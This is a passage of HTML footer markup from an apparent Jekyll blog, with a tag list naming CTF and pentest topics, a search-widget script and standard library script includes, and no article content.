class="post-tag" href="/tags/beginner/">beginner</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/windows/">windows</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
